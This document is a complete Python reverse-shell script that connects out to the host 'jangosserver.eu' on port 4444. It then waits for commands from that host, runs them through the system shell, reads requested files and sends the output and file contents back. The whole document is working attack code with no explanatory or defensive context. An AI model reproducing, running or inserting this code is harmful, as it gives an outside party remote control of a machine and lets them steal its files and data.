import socket
import subprocess
import os

domain = "jangosserver.eu"
PORT = 4444


def reverse_shell():
    try:
        IP = socket.gethostbyname(domain)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))

        while True:
            cwd = os.getcwd()
            s.send(f"{cwd}> ".encode())
            
            command = s.recv(1024).decode("utf-8").strip()  
            if command.lower() == "exit":
                break  

            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    s.send(b"\n")
                except Exception as e:
                    s.send(str(e).encode() + b"\n")
                continue

            if command.startswith("cat "):
                file_path = command[4:]  
                try:
                    with open(file_path, 'r') as f:
                        content = f.read()
                        if not content:
                            content = "File is empty.\n"
                        s.send(content.encode())
                except Exception as e:
                    s.send(f"Error reading file: {e}".encode() + b"\n")
                continue

            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = output.stdout + output.stderr
            s.send(response.encode())

        s.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    reverse_shell()
